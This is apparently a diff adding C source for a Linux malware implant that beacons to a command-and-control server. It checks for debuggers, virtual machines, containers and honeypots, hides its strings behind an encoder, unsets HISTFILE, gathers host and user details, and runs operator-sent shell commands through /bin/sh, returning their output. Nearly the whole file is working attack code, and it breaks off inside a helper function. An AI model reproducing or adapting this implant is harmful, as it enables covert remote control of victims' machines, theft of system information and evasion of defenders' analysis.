@@ -1,0 +1,1148 @@
+/*
+    TODO:
+        - Smt in memory (leaks and/or overflow residual)
+
+*/
+
+#include <bits/posix1_lim.h>
+#include <endian.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <sys/time.h>
+#include <sys/select.h>
+#include <signal.h>
+#include <limits.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <math.h>
+#include <unistd.h>
+#include <cpuid.h>
+#include <stdarg.h>
+#include <sys/ptrace.h>
+#include <errno.h>
+#include "libwrapper.h"
+#include "macros.h"
+
+// helper defs
+char* parseExecOutput(int pipeInt);
+char** splitStr(char *str, char *delim, int *count);
+char* decodeMacro(char *macroEncoded, int *payloadEncoderID);
+int parseInt(char *string, int fallback);
+int verifyDir(char *dirPath);
+int fileHas(char *filePath, char *content);
+char *joinPath(char *basePath, ...);
+
+// funcs defs
+// evasion
+
+int evasionOnce(int *payloadEncoderID);
+int isDebuggerPresent(int *payloadEncoderID);
+int checkHypervisorFlag(int *payloadEncoderID);
+int checkDmiID(int *payloadEncoderID);
+int evadeHoneypot(int *payloadEncoderID);
+int checkVMFiles(int *payloadEncoderID);
+int checkContainer(int *payloadEncoderID);
+
+// stage
+int sec();
+int getPayloadEncoder();
+int getProtocol(int *payloadEncoderID);
+int getConnection(int protocolID);
+double jitterIT(double baseVal, double jitter);
+void whileSleep(long sleepTime);
+void sleepBeacon();
+int retry(int baseDelay, char *method, int currentAttempt, int maxAttemptsCap, int *payloadEncoderID);
+C_Scroll fetchTargetInfo(int *payloadEncoderID);
+void beacon(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID);
+
+// types
+typedef struct {
+    const char* methodName;
+    int (*methodFunc)(int currentAttempt, int baseDelay);
+
+} retryMethods;
+
+typedef struct {
+    const char* commandName;
+    int (*beaconCommandFunc)(char *data, int connID, int *payloadEncoderID);
+
+} beaconCommands;
+
+// main
+int main() {
+    srand(time(NULL)); // Rand seed
+
+    int _payloadEncoderID = getPayloadEncoder();
+    int *payloadEncoderID = &_payloadEncoderID;
+    if (payloadEncoderID == 0) {
+        return 0;
+
+    }
+
+    if (evasionOnce(payloadEncoderID) != 0) {
+        printf("Evasion returned 1\n");
+        return 0;
+
+    }
+
+    return sec();
+
+    
+}
+
+// Evasion
+
+/*
+Checks every evasion method once
+
+*/
+int evasionOnce(int *payloadEncoderID) {
+    if (
+        isDebuggerPresent(payloadEncoderID) != 0 || 
+        checkHypervisorFlag(payloadEncoderID) != 0 ||
+        checkDmiID(payloadEncoderID) != 0 ||
+        evadeHoneypot(payloadEncoderID) != 0 ||
+        checkVMFiles(payloadEncoderID) != 0 ||
+        checkContainer(payloadEncoderID) != 0
+    
+    ) {
+        return 1;
+        
+    }
+
+    return 0;
+
+};
+
+/*
+Verify if current process have a Tracer (debugger) attached
+
+*/
+int isDebuggerPresent(int *payloadEncoderID) {
+    char *filePath = decodeMacro(PROC_SELF_STATUS, payloadEncoderID);
+    char *tracerPidStr = decodeMacro(TRACERPID_VAL, payloadEncoderID);
+    char _fileLine[4096];
+    FILE *_file = fopen(filePath, "r");
+
+    if (_file != NULL) {
+        while (fgets(_fileLine, 4096, _file)) {
+            if (strncmp(_fileLine, tracerPidStr, 10) == 0) {
+                int pid = atoi(&_fileLine[10]);
+
+                fclose(_file);
+                FreeGoMem(filePath);
+                FreeGoMem(tracerPidStr);
+                
+                return pid != 0;
+
+            }
+
+        }
+
+    }
+
+    FreeGoMem(filePath);
+    FreeGoMem(tracerPidStr);
+
+    return 0;
+
+};
+
+/*
+Check if /proc/cpuinfo has the flag 'hypervisor'
+
+*/
+int checkHypervisorFlag(int *payloadEncoderID) {
+    char *_cpuInfo = decodeMacro(PROC_CPUINFO_PATH, payloadEncoderID);
+    char *_hypervisor = decodeMacro(HYPERVISOR_VAL, payloadEncoderID);
+    
+    int r = fileHas(_cpuInfo, _hypervisor);
+
+    FreeGoMem(_cpuInfo);
+    FreeGoMem(_hypervisor);
+
+    return r;
+
+};
+
+/*
+Check for VM in /sys/class/dmi/id/* files
+
+*/
+int checkDmiID(int *payloadEncoderID) {
+    char *_blacklistUnsplit = decodeMacro(VMS_BLACKLIST_UNSPLIT, payloadEncoderID);
+    char *_blacklistSep = decodeMacro(VMS_BLACKLIST_SEP, payloadEncoderID);
+    
+    int blacklistLen = 0;
+    char **blacklist = splitStr(_blacklistUnsplit, _blacklistSep, &blacklistLen);
+
+    char *basePath = decodeMacro(SYS_CLASS_DMI_ID, payloadEncoderID);
+    char *_tmp_sysVendor = decodeMacro(SCDI_SYS_VENDOR, payloadEncoderID);
+    char *_tmp_biosVendor = decodeMacro(SCDI_BIOS_VENDOR, payloadEncoderID);
+    char *_tmp_chassisVendor = decodeMacro(SCDI_CHASSIS_VENDOR, payloadEncoderID);
+
+    char *paths[] = {
+        joinPath(basePath, _tmp_sysVendor, NULL),
+        joinPath(basePath, _tmp_biosVendor, NULL),
+        joinPath(basePath, _tmp_chassisVendor, NULL),
+
+    };
+
+    int vm = 0;
+    for (int i = 0; i < 3; i++) {
+        if (vm == 1) {
+            break;
+
+        }
+
+        for (int ii = 0; ii < blacklistLen; ii++) {
+            if (fileHas(paths[i], blacklist[ii]) != 0) {
+                vm = 1;
+                break;
+
+            }
+
+        }
+
+    }
+
+    FreeGoMem(_blacklistUnsplit);
+    FreeGoMem(_blacklistSep);
+    FreeGoMem(basePath);
+    free(blacklist);
+    FreeGoMem(_tmp_sysVendor);
+    FreeGoMem(_tmp_biosVendor);
+    FreeGoMem(_tmp_chassisVendor);
+    for (int i = 0; i < 3; i++) {
+        FreeGoMem(paths[i]);
+    
+    }
+
+    return vm;
+
+};
+
+/*
+Check if /proc exists, if not, identify as a honeypot
+
+*/
+int evadeHoneypot(int *payloadEncoderID) {
+    char *procPath = decodeMacro(PROC_PATH, payloadEncoderID);
+    int r = verifyDir(procPath);
+    
+    FreeGoMem(procPath);
+    return r;
+
+};
+
+/*
+Check if some files, that exists in VMs, exists
+
+*/
+int checkVMFiles(int *payloadEncoderID) {
+    char *_blacklistUnsplit = decodeMacro(VMS_FILES_BLACKLIST_UNSPLIT, payloadEncoderID);
+    char *_blacklistSep = decodeMacro(VMS_BLACKLIST_SEP, payloadEncoderID);
+
+    int blacklistLen = 0;
+    char **blacklist = splitStr(_blacklistUnsplit, _blacklistSep, &blacklistLen);
+
+    int vm = 0;
+    for (int i = 0; i < blacklistLen; i++) {
+        if (vm != 0) {
+            break;
+
+        }
+
+        if (access(blacklist[i], 0) == 0) {
+            vm = 1;
+
+        }
+
+    }
+
+    FreeGoMem(_blacklistUnsplit);
+    FreeGoMem(_blacklistSep);
+    free(blacklist);
+
+    return vm;
+
+};
+
+/*
+Check if proc/self/cgroup has one of blacklisted names, if so, assumes that the malware is running in a container
+
+*/
+int checkContainer(int *payloadEncoderID) {
+    char *cgroup = decodeMacro(PROC_SELF_CGROUP, payloadEncoderID);
+    char *_blacklistUnsplit = decodeMacro(CONTAINER_BLACKLIST_CGROUP, payloadEncoderID);
+    char *_blacklistSep = decodeMacro(VMS_BLACKLIST_SEP, payloadEncoderID);
+
+    int blacklistLen = 0;
+    char **blacklist = splitStr(_blacklistUnsplit, _blacklistSep, &blacklistLen);
+
+    int container = 0;
+    for (int i = 0; i < blacklistLen; i++) {
+        if (container != 0) {
+            break;
+
+        }
+
+        if (fileHas(cgroup, blacklist[i]) != 0) {
+            container = 1;
+
+        }
+
+    }
+
+    FreeGoMem(cgroup);
+    FreeGoMem(_blacklistUnsplit);
+    FreeGoMem(_blacklistSep);
+    free(blacklist);
+
+    return container;
+
+};
+
+// Sec stage
+int sec() {
+    srand(time(NULL)); // Rand seed
+
+    int _payloadEncoderID = getPayloadEncoder();
+    int *payloadEncoderID = &_payloadEncoderID;
+    if (payloadEncoderID == 0) {
+        return 0;
+
+    }
+
+    int protocolID = getProtocol(payloadEncoderID);
+    if (protocolID == 0) {
+        return 0;
+
+    }
+
+    char *retryMethod = decodeMacro(RETRY_METHOD, payloadEncoderID);
+    char *_tmp_retryMethodNone = decodeMacro(RETRY_METHOD_NONE, payloadEncoderID);
+    char *_tmp_retryMethodFixed = decodeMacro(RETRY_METHOD_FIXED, payloadEncoderID);
+    char *_tmp_retryMethodLinear = decodeMacro(RETRY_METHOD_LINEAR, payloadEncoderID);
+    char *_tmp_retryMethodExponential = decodeMacro(RETRY_METHOD_EXPONENTIAL, payloadEncoderID);
+    char *_tmp_retryMethodExponentialJitter = decodeMacro(RETRY_METHOD_EXPONENTIAL_JITTER, payloadEncoderID);
+    if (
+        strcmp(retryMethod, _tmp_retryMethodNone) != 0 &&
+        strcmp(retryMethod, _tmp_retryMethodFixed) != 0 &&
+        strcmp(retryMethod, _tmp_retryMethodLinear) != 0 && 
+        strcmp(retryMethod, _tmp_retryMethodExponential) != 0 && 
+        strcmp(retryMethod, _tmp_retryMethodExponentialJitter) != 0
+    
+    ) {
+        retryMethod = decodeMacro(RETRY_METHOD_FIXED, payloadEncoderID);
+
+    }
+
+    // Free the memory: "who allocate, free"
+    FreeGoMem(_tmp_retryMethodNone);
+    FreeGoMem(_tmp_retryMethodFixed);
+    FreeGoMem(_tmp_retryMethodLinear);
+    FreeGoMem(_tmp_retryMethodExponential);
+    FreeGoMem(_tmp_retryMethodExponentialJitter);
+
+    char *retryDelayStr = decodeMacro(RETRY_DELAY, payloadEncoderID);
+    int retryDelay = parseInt(retryDelayStr, 5);
+
+    char *retryAttemptsCapStr = decodeMacro(RETRY_ATTEMPTS_CAP, payloadEncoderID);
+    int retryAttemptsCap = parseInt(retryAttemptsCapStr, 10);
+
+    char *_tmp_histfile = decodeMacro(ENV_HISTFILE, payloadEncoderID);
+    unsetenv(_tmp_histfile);
+
+    while (1) {
+        sleepBeacon();
+        beacon(protocolID, retryDelay, retryAttemptsCap, retryMethod, payloadEncoderID);
+
+    }
+
+    FreeGoMem(retryMethod);
+    return 0;    
+
+};
+
+int getPayloadEncoder() {
+    char payloadEncoderJsonParams[4096] = "";
+    char *payloadEncoderName = PAYLOAD_ENCODER_NAME;
+    char *payloadEncoderKey = PAYLOAD_ENCODER_KEY;
+
+    char protocolEncoderJsonParams[4096] = "";
+    int _tmp_charsWritten = snprintf(payloadEncoderJsonParams, sizeof(payloadEncoderJsonParams), "{\"KEY\": \"%s\"}", payloadEncoderKey);
+    if (_tmp_charsWritten >= (int)sizeof(payloadEncoderJsonParams)) {
+        return 0; // Params truncated
+
+    }
+
+    int _payloadEncoderID = CreateEncoder(payloadEncoderName, strlen(payloadEncoderName), payloadEncoderJsonParams, strlen(payloadEncoderJsonParams));
+    if (_payloadEncoderID == 0) {
+        return 0; // Encoder not found or some error occurred
+
+    }
+
+    return _payloadEncoderID;
+
+};
+
+int getProtocol(int *payloadEncoderID) {
+    char protocolEncoderJsonParams[8192] = "";
+    char *lhost = decodeMacro(LHOST, payloadEncoderID);
+    char *lport = decodeMacro(LPORT, payloadEncoderID);
+    char *protocolEncoderName = decodeMacro(PROTOCOL_ENCODER_NAME, payloadEncoderID);
+    char *protocolEncoderKey = decodeMacro(PROTOCOL_ENCODER_KEY, payloadEncoderID);
+
+    int _tmp_charsWritten = snprintf(protocolEncoderJsonParams, sizeof(protocolEncoderJsonParams), "{\"LHOST\": \"%s\", \"LPORT\": \"%s\", \"FIDELIUS\": \"%s\", \"KEY\": \"%s\"}", lhost, lport, protocolEncoderName, protocolEncoderKey);
+    if (_tmp_charsWritten >= (int)sizeof(protocolEncoderJsonParams)) {
+        return 0; // Params truncated by snprintf
+
+    }
+
+    char *protocolName = decodeMacro(PROTOCOL_NAME, payloadEncoderID);
+    int protocolID = CreateProtocol(protocolName, strlen(protocolName), protocolEncoderJsonParams, strlen(protocolEncoderJsonParams), protocolEncoderName, strlen(protocolEncoderName));
+    if (protocolID == 0) {
+        return 0; // Some error occurred during protocol creating
+
+    }
+
+    FreeGoMem(lhost);
+    FreeGoMem(lport);
+    FreeGoMem(protocolEncoderName);
+    FreeGoMem(protocolEncoderKey);
+    FreeGoMem(protocolName);
+    return protocolID;
+
+};
+
+int getConnection(int protocolID) {
+    int connectionID = InitArcane(protocolID);
+    if (connectionID == 0) {
+        return 0; // Some error occurred or protocolID's reffered protocol do not exists
+
+    }
+
+    return connectionID;
+
+};
+
+C_Scroll fetchTargetInfo(int *payloadEncoderID) {
+    /*
+        NOTES:
+            - As it is a basic spell, i'll not set smts like av_data
+
+    */
+
+    C_Scroll botData;
+    memset(&botData, 0, sizeof(botData));
+    char cpuName[49];
+    unsigned int cores = 0, threads = 0, cache = 0;
+    double cpuClock = 0.0;
+    char _cpuinfoLine[256];
+
+    unsigned int eax, ebx, ecx, edx;
+    
+    cpuName[0] = '\0';
+    for (int i = 0x80000002; i <= (int)0x80000004; i++) {
+        if (__get_cpuid(i, &eax, &ebx, &ecx, &edx)) {
+            unsigned int *_p = (unsigned int*)(cpuName + (i - 0x80000002) * 16);
+            _p[0] = eax; _p[1] = ebx; _p[2] = ecx; _p[3] = edx;
+
+        }
+
+    }
+
+    cpuName[48] = '\0';
+    unsigned int _maxLeaf = __get_cpuid_max(0, NULL);
+    if (_maxLeaf >= 4) {
+        __cpuid_count(4, 0, eax, ebx, ecx, edx);
+        threads = ((eax >> 26) & 0x3F) + 1;
+
+        __cpuid_count(0xB, 0, eax, ebx, ecx, edx);
+        cores = threads / (ebx & 0xFFF);
+
+        int _i = 0;
+        while (1) {
+            __cpuid_count(4, _i, eax, ebx, ecx, edx);
+            unsigned int cacheType = eax & 0x1F;
+            if (cacheType == 0) break; // End of count
+
+            unsigned int _size = (((ebx >> 22) & 0x3FF) + 1) * (((ebx >> 12) & 0x3FF) + 1) * ((ebx & 0xFFF) + 1) * (ecx + 1) / 1024;
+            cache += _size;
+            _i++;
+
+        }
+
+    }
+
+    char *_tmp_procCpuinfoPath = decodeMacro(PROC_CPUINFO_PATH, payloadEncoderID);
+    FILE *_cpuinfo = fopen(_tmp_procCpuinfoPath, "r");
+    if (_cpuinfo != NULL) {
+        while (fgets(_cpuinfoLine, 256, _cpuinfo)) {
+            if (strstr(_cpuinfoLine, "cpu MHz")) {
+                sscanf(_cpuinfoLine, "cpu MHz: %lf", &cpuClock);
+                break;
+
+            }
+
+        }
+
+        fclose(_cpuinfo);
+
+    }
+
+    strcpy(botData.CPU.Name, cpuName);
+    botData.CPU.Cores = cores;
+    botData.CPU.Threads = threads;
+    botData.CPU.Cache = cache;
+    botData.CPU.Clock = (int)cpuClock;
+    strcpy(botData.CPU.Arch, "x86_64");
+
+    FreeGoMem(_tmp_procCpuinfoPath);
+
+    char osHostname[128];
+    char osName[128];
+    char osVersion[128];
+    char *osUsername = "";
+    double osUptime;
+
+    char *_tmp_hostnamePath = decodeMacro(HOSTNAME_PATH, payloadEncoderID);
+    FILE *_hostname = fopen(_tmp_hostnamePath, "r");
+    char _hostnameLine[256];
+    if (_hostname != NULL) {
+        while(fgets(_hostnameLine, 256, _hostname)) {
+            sscanf(_hostnameLine, "%s", osHostname);
+            break;
+
+        }
+
+        fclose(_hostname);
+
+    }
+
+    char *_tmp_osReleasePath = decodeMacro(OS_RELEASE_PATH, payloadEncoderID);
+    FILE *_osRealease = fopen(_tmp_osReleasePath, "r");
+    char _osRealeaseLine[512];
+    if (_osRealease != NULL) {
+        if (fgets(_osRealeaseLine, 512, _osRealease) != NULL) {
+            sscanf(_osRealeaseLine, "NAME=\"%s\"", osName);
+            sscanf(_osRealeaseLine, "VERSION=\"%s\"", osVersion);
+            
+        }
+
+        fclose(_osRealease);
+
+    }
+
+    long _limit = sysconf(_SC_GETPW_R_SIZE_MAX);
+    if (_limit == -1) _limit = 1024;
+
+    char *_username = malloc(_limit);
+    if (_username) {
+        if (getlogin_r(_username, _limit) == 0) {
+            osUsername = (char*)malloc(strlen(_username) + 1);
+            if (osUsername != NULL) {
+                strcpy(osUsername, _username);
+                free(_username);
+                
+            }
+            
+        }
+
+    }
+
+    char *_tmp_uptimePath = decodeMacro(UPTIME_PATH, payloadEncoderID);
+    FILE *_uptime = fopen(_tmp_uptimePath, "r");
+    char _uptimeLine[512];
+    if (_uptime != NULL) {
+        if (fgets(_uptimeLine, 512, _uptime) != NULL) {
+            sscanf(_uptimeLine, "%lf", &osUptime);
+
+        }
+
+    }
+
+    strcpy(botData.OS.Name, osName);
+    strcpy(botData.OS.Version, osVersion);
+    strcpy(botData.OS.Arch, "x86");
+    strcpy(botData.OS.Hostname, osHostname);
+    strcpy(botData.OS.Username, osUsername);
+    botData.OS.Uptime = (int)osUptime;
+
+    FreeGoMem(_tmp_osReleasePath);
+
+    return botData;
+
+};
+
+double jitterIT(double baseVal, double jitter) {
+    double delta = baseVal * (jitter / 100.0);
+    double min = baseVal - delta;
+    double max = baseVal + delta;
+
+    double randomVal = (double)rand() / RAND_MAX;
+    return min + randomVal * (max - min);
+
+};
+
+void whileSleep(long sleepTime) {
+    // This snippet is AI generated but a human developer refined it
+
+    long start = time(NULL);
+    long end = start + sleepTime;
+    while (time(NULL) < end) {
+        struct timeval tv;
+        long remainingSecs = end - time(NULL);
+        
+        if (remainingSecs <= 0) break;
+
+        tv.tv_sec = (remainingSecs < 1) ? 0 : 1;
+        tv.tv_usec = 0;
+
+        select(0, NULL, NULL, NULL, &tv);
+
+    }
+
+};
+
+void sleepBeacon() {
+    char *beaconTime = BEACON_TIME;
+    int baseSleepTime = parseInt(beaconTime, 5);
+
+    char *jitter = JITTER;
+    double sleepJitterTime = (double)parseInt(jitter, 58);
+    int sleepTime = (int)jitterIT((double)baseSleepTime, sleepJitterTime);
+    whileSleep(sleepTime);
+
+};
+
+int _retryMethod_none(int currentAttempt, int baseDelay) {
+    return 0;
+
+};
+
+int _retryMethod_fixed(int currentAttempt, int baseDelay) {
+    whileSleep(baseDelay);
+    return 1;
+
+};
+
+int _retryMethod_linear(int currentAttempt, int baseDelay) {
+    int sleepTime = currentAttempt * baseDelay;
+    whileSleep(sleepTime);
+    return 1;
+
+};
+
+int _retryMethod_exponential(int currentAttempt, int baseDelay) {
+    int sleepTime = baseDelay * (int)pow(currentAttempt, 2);
+    whileSleep(sleepTime);
+    return 1;
+
+};
+
+int _retryMethod_exponentialJitter(int currentAttempt, int baseDelay) {
+    char *jitterStr = JITTER;
+    double jitter = parseInt(jitterStr, 58);
+
+    int sleepTime = baseDelay * (int)jitterIT((double)(pow(currentAttempt, 2)), jitter);
+    whileSleep(sleepTime);
+    return 1;
+
+};
+
+int retry(int baseDelay, char* method, int currentAttempt, int maxAttemptsCap, int *payloadEncoderID) {
+    if (currentAttempt > maxAttemptsCap) {
+        return 0;
+
+    }
+
+    char *_tmp_retryMethodNone = decodeMacro(RETRY_METHOD_NONE, payloadEncoderID);
+    char *_tmp_retryMethodFixed = decodeMacro(RETRY_METHOD_FIXED, payloadEncoderID);
+    char *_tmp_retryMethodLinear = decodeMacro(RETRY_METHOD_LINEAR, payloadEncoderID);
+    char *_tmp_retryMethodExponential = decodeMacro(RETRY_METHOD_EXPONENTIAL, payloadEncoderID);
+    char *_tmp_retryMethodExponentialJitter = decodeMacro(RETRY_METHOD_EXPONENTIAL_JITTER, payloadEncoderID);
+
+    retryMethods retryMethodsTable[] = {
+        {_tmp_retryMethodNone, _retryMethod_none},
+        {_tmp_retryMethodFixed, _retryMethod_fixed},
+        {_tmp_retryMethodLinear, _retryMethod_linear},
+        {_tmp_retryMethodExponential, _retryMethod_exponential},
+        {_tmp_retryMethodExponentialJitter, _retryMethod_exponentialJitter}
+
+    };
+
+    int _methodsCount = sizeof(retryMethodsTable) / sizeof(retryMethodsTable[0]);
+    int (*sleepFunc)(int currentAttempt, int baseDelay) = _retryMethod_fixed; // Fallback if method is out of the table range
+
+    for (int i = 0; i < _methodsCount; i++) {
+        if (strcmp(method, retryMethodsTable[i].methodName) == 0) {
+            sleepFunc = retryMethodsTable[i].methodFunc;
+            break;
+
+        }
+
+    }
+    
+    int retrySleep = sleepFunc(currentAttempt, baseDelay);
+    if (retrySleep == 0) {
+        return 0;
+
+    }
+
+    FreeGoMem(_tmp_retryMethodNone);
+    FreeGoMem(_tmp_retryMethodFixed);
+    FreeGoMem(_tmp_retryMethodLinear);
+    FreeGoMem(_tmp_retryMethodExponential);
+    FreeGoMem(_tmp_retryMethodExponentialJitter);
+    return 1;
+
+};
+
+int _beacon_connHandler(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID) {
+    int retryCount = 1;
+    int connID;
+    while (1) {
+        connID = getConnection(protocolID);
+        if (connID == 0) {
+            int retryResult = retry(retryBaseDelay, retryMethod, retryCount, maxAttemptsCap, payloadEncoderID);
+            if (retryResult == 0) {
+                return 0; // 'none' mode or cap beat
+
+            }
+
+            // connID = getConnection(protocolID);
+            retryCount++;
+            continue;
+
+        }
+
+        break;
+
+    }
+    
+    return connID;
+
+};
+
+char* _beacon_receiveHandler(int connID) {
+    char *receivedData;
+    int receivedDataLen;
+    int receiveDataFromC2 = Receive(connID, &receivedData, &receivedDataLen);
+
+    /*
+        note: this switch is just for better understanding (dev context)
+        compiler must optimize this to smt like:
+        
+        if val == 1 {
+            do nothing
+        
+        } else {
+            free and return
+            
+        }
+
+    */
+    switch (receiveDataFromC2) {
+    case 3:
+        FreeGoMem(receivedData);
+        return NULL; // Malloc failed
+
+    case 2:
+        FreeGoMem(receivedData);
+        return NULL; // Conn closed
+
+    case 0:
+        FreeGoMem(receivedData);
+        return NULL; // Smt failed in communication
+
+    }
+
+    return receivedData;
+
+};
+
+int _beacon_commands_exec(char *data, int connID, int *payloadEncoderID) {
+    int pipeOut[2];
+    pid_t procPID;
+
+    if (pipe(pipeOut) == -1) {
+        return 0; // Error in pipe
+
+    }
+
+    procPID = fork();
+    char *cmd = decodeMacro(BIN_SH_PATH, payloadEncoderID);
+    if (procPID < 0) {
+        char *failMessage = decodeMacro(REQUEST_FROM_C2_FAILED, payloadEncoderID);
+        Send(connID, failMessage, strlen(failMessage));
+        FreeGoMem(failMessage);
+        return 0;
+
+    } else if (procPID == 0) {
+        char *cmdArgs[] = {cmd, "-c", data, NULL};
+
+        // Redirect stdout/err
+        dup2(pipeOut[1], STDOUT_FILENO);
+        dup2(pipeOut[1], STDERR_FILENO);
+
+        close(pipeOut[0]);
+        close(pipeOut[1]);
+
+        execvp(cmd, cmdArgs);
+        _exit(127); // Exit 127 means "Command not found", the _exit instead of exit will not use atexit() handlers, GPT said that it is the convention for subprocess that runs commands
+
+    } else {
+        close(pipeOut[1]);
+
+        char *execOutput = parseExecOutput(pipeOut[0]);
+
+        close(pipeOut[0]);
+
+        waitpid(procPID, NULL, 0);
+
+        if (execOutput) {
+            int _tmp_sendData = Send(connID, execOutput, strlen(execOutput));
+            free(execOutput);
+            if (_tmp_sendData != 1) {
+                return 0;
+            }
+        }
+    }
+
+    return 1;
+
+};
+
+int _beacon_commands_getBotData(char *data, int connID, int *payloadEncoderID) {
+    C_Scroll botData = fetchTargetInfo(payloadEncoderID);
+    char *botDataString;
+    int botDataStringLen = SPrintScroll(botData, &botDataString);
+
+    Send(connID, botDataString, botDataStringLen);
+    return SetScroll(connID, &botData);
+
+};
+
+int _beacon_commandHandler(char *data, int connID, int *payloadEncoderID) {
+    char *_tmp_beaconCommandsExec = decodeMacro(BEACON_COMMANDS_EXEC, payloadEncoderID);
+    char *_tmp_beaconCommandsGetBotData = decodeMacro(BEACON_COMMANDS_GET_BOT_DATA, payloadEncoderID);
+    beaconCommands AvaliableCommands[] = {
+        {_tmp_beaconCommandsExec, _beacon_commands_exec},
+        {_tmp_beaconCommandsGetBotData, _beacon_commands_getBotData}
+
+    };
+
+    int commandsCount = (int)sizeof(AvaliableCommands) / sizeof(AvaliableCommands[0]);
+
+    if (data == NULL) {
+        FreeGoMem(_tmp_beaconCommandsGetBotData);
+        FreeGoMem(_tmp_beaconCommandsExec);
+        return 0;
+
+    }
+
+    const unsigned char *buf = (const unsigned char*)data;
+
+    uint64_t commandLen;
+    memcpy(&commandLen, buf, sizeof(uint64_t));
+    commandLen = be64toh(commandLen);
+
+    if (commandLen > strlen(data) - sizeof(uint64_t)) {
+        return 0;
+
+    }
+
+    const unsigned char *commandFromC2 = buf + sizeof(uint64_t);
+    const char *args = (const char*)(commandFromC2 + commandLen);
+    if (commandLen >= strlen(data) - sizeof(uint64_t)) {
+        args = "";
+    
+    }
+
+    int (*command)(char *data, int connID, int *payloadEncoderID) = NULL;
+
+    for (int i = 0; i < commandsCount; i++) {
+        if (memcmp(AvaliableCommands[i].commandName, commandFromC2, commandLen) == 0) {
+            command = AvaliableCommands[i].beaconCommandFunc;
+            break;
+
+        }
+
+    }
+
+    if (command == NULL) {
+        FreeGoMem(_tmp_beaconCommandsGetBotData);
+        FreeGoMem(_tmp_beaconCommandsExec);
+
+        return 0; // Command Not Found
+
+    }
+
+    int commandExec = command((char*)args, connID, payloadEncoderID);
+    if (commandExec == 0) {
+        FreeGoMem(_tmp_beaconCommandsGetBotData);
+        FreeGoMem(_tmp_beaconCommandsExec);
+
+        return 0; // Some error occurred
+
+    }
+
+    FreeGoMem(_tmp_beaconCommandsGetBotData);
+    FreeGoMem(_tmp_beaconCommandsExec);
+
+    return 1;
+
+};
+
+void beacon(int protocolID, int retryBaseDelay, int maxAttemptsCap, char *retryMethod, int *payloadEncoderID) {
+    int connID = _beacon_connHandler(protocolID, retryBaseDelay, maxAttemptsCap, retryMethod, payloadEncoderID);
+    if (connID == 0) {
+        return; // 'none' mode or cap beat
+
+    }
+
+    char *dataFromC2 = _beacon_receiveHandler(connID);
+    if (dataFromC2 == NULL) {
+        return; // Some error occurred
+        
+    }
+
+    int handleCommand = _beacon_commandHandler(dataFromC2, connID, payloadEncoderID);
+    
+    FreeGoMem(dataFromC2);
+    Close(connID);
+
+};
+
+// helpers
+int parseInt(char* string, int fallback) {
+    char *end;
+    long longFromStr = strtol(string, &end, 10);
+    if (*end != '\0' || longFromStr > INT_MAX || longFromStr < INT_MIN) {
+        return fallback;
+
+    }
+
+    return (int)longFromStr;
+
+};
+
+char* decodeMacro(char* macroEncoded, int *payloadEncoderID) {
+    _go_base64 macroDecodedB64 = _b64_d(macroEncoded);
+    if (macroDecodedB64.data == NULL) {
+       return NULL; // Can't parse smt, quit to avoid trouble
+
+    }
+
+    int maxAttempts = 5;
+    int currentAttempt = 0;
+    unsigned char *_decodedMacro = NULL;
+    int _decodedMacroStatus = 0;
+    while (_decodedMacroStatus == 0 && currentAttempt < maxAttempts) {
+        DestroyEncoder(*payloadEncoderID);
+        *payloadEncoderID = getPayloadEncoder();
+        int _decodedMacroLen = 0;
+        _decodedMacroStatus = Decode(*payloadEncoderID, macroDecodedB64.data, macroDecodedB64.len, &_decodedMacro, &_decodedMacroLen);
+
+    }
+
+    return (char*)_decodedMacro;
+
+};
+
+char** splitStr(char *str, char *delim, int *count) {
+    char **newStr = NULL;
+    int tokens = 0;
+    const char *start = str;
+    const char *p = str;
+    int delimLen = (int)strlen(delim);
+
+    while (*p) {
+        if (strncmp(p, delim, delimLen) == 0) {
+            int partlen = p - start;
+
+            char *token = (char*)malloc(partlen + 1); // needs to be free by caller
+            if (token == NULL) {
+                return NULL;
+
+            }
+            
+            memcpy(token, start, partlen);
+            token[partlen] = '\0';
+
+            newStr = (char**)realloc(newStr, sizeof(char*) * (tokens + 1));
+            if (newStr == NULL) {
+                free(token);
+                return NULL;
+
+            }
+
+            newStr[tokens++] = token;
+
+            p += strlen(delim);
+            start = p;
+
+        } else {
+            p++;
+        
+        }
+
+    }
+
+    if (start != p) { // note: this is for the last token :3. I think that we can do that in while but this implementation already looks good :D
+        int partlen = p - start;
+        
+        char *token = (char*)malloc(partlen + 1); // same thing
+        if (token == NULL) {
+            return NULL;
+        
+        }
+
+        memcpy(token, start, partlen);
+        token[partlen] = '\0';
+
+        newStr = (char**)realloc(newStr, sizeof(char*) * (tokens + 1));
+        if (newStr == NULL) {
+            free(token);
+            return NULL;
+
+        }
+
+        newStr[tokens++] = token;
+
+    }
+
+    *count = tokens;
+    return newStr;
+
+};
+
+char* parseExecOutput(int pipeInt) {
+    size_t bufferCap = 65536; // 64KB in init, can be higher
+    size_t bufferLen = 0;
+    char *buffer = malloc(bufferCap);
+    if (buffer == NULL) {
+        return NULL;
+
+    }
+
+    char _tmp[4096];
+    ssize_t _n;
+
+    while ((_n = read(pipeInt, _tmp, sizeof(_tmp))) > 0) {
+        while ((bufferLen + _n + 1) > bufferCap) {
+            bufferCap *= 2;
+        
+        }
+        
+        char *newBuffer = realloc(buffer, bufferCap);
+        if (newBuffer == NULL) {
+            free(buffer);
+            return NULL;
+
+        }
+
+        buffer = newBuffer;
+
+        memcpy(buffer + bufferLen, _tmp, _n);
+        bufferLen += _n;
+
+    }
+
+    buffer[bufferLen] = '\0';
+    return buffer;
+
+};
+
+int verifyDir(char *dirPath) {
+    if (access(dirPath, 0) != -1) {
+        struct stat st;
+        if (stat(dirPath, &st) == 0 && S_ISDIR(st.st_mode)) {            
+            return 0;
+
+        }
+
+        return 1; // Not a dir
+
+    }
+
+    return 1; // Can't access 
+
+};
+
+int fileHas(char *filePath, char *content) {
+    char _fileLine[4096];
+    FILE *_file = fopen(filePath, "r");
+    if (_file != NULL) {
+        while (fgets(_fileLine, 4096, _file)) {
+            if (strstr(_fileLine, content)) {
+                fclose(_file);
+                return 1;
+
+            }
+
+        }
+
+    }
+
+    return 0; // Can't open file or do not has the expected content
+    
+}
+
+/*
+Reads all args untill null and path.join it
+
+*/
+char *joinPath(char *basePath, ...) {
+    va_list args;
+
+    char format[4096];
+    char output[4096];
+    format[0] = '\0';
+    output[0] = '\0';
+
